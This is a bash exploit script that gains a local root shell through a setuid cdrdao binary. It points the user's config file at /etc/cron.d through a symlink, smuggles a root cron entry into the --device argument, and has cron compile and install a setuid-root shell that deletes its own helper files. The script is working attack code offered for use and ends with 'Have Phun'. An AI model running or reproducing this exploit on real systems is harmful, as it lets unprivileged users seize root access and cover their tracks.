#!/bin/bash

## cdrdaohack.sh by Jens "atomi" Steube

ROOTEXECDIR="/etc/cron.d/cdr"
CDRDAO="/usr/bin/cdrdao"
USERCONF="$HOME/.cdrdao"

echo "Testing $CDRDAO"
if [ ! -u $CDRDAO ]; then
  echo "ERROR: $CDRDAO is not setuid or does not exist"
  exit 1
fi

echo "Generating Helper Files"

cat > /tmp/daosh.c << EOF
int main () { 
setuid(0); setgid(0);
unlink("/tmp/dao.sh");
unlink("/tmp/daosh.c");
unlink("/etc/cron.d/cdr");
unlink("$HOME/.cdrdao");
execl("/bin/bash","bash","-i",0);
}
EOF

cat > /tmp/dao.sh << EOF
cc -o /tmp/daosh /tmp/daosh.c >/dev/null 2>&1
chown root /tmp/daosh >/dev/null 2>&1
chgrp root /tmp/daosh >/dev/null 2>&1
chmod 6755 /tmp/daosh >/dev/null 2>&1
exit 0
EOF

chmod 700 /tmp/dao.sh

echo "Backing up original $USERCONF file to $USERCONF.orig"
mv $USERCONF $USERCONF.orig >/dev/null 2>&1

echo "Creating Symlink on $USERCONF to $ROOTEXECDIR"
ln -s $ROOTEXECDIR $USERCONF

echo "Executing $CDRDAO"

$CDRDAO write --save --device '
* * * * * root /tmp/dao.sh >/dev/null 2>&1
#' --buffers '
' . >/dev/null 2>&1

echo "Waiting for Rootshell, wait at least 3 minutes"
while [ ! -u /tmp/daosh ]; do
  echo -n "."
  sleep 1
done

echo
echo "Entering Rootshell and removing Helper Files"
echo "Have Phun :-)"
/tmp/daosh

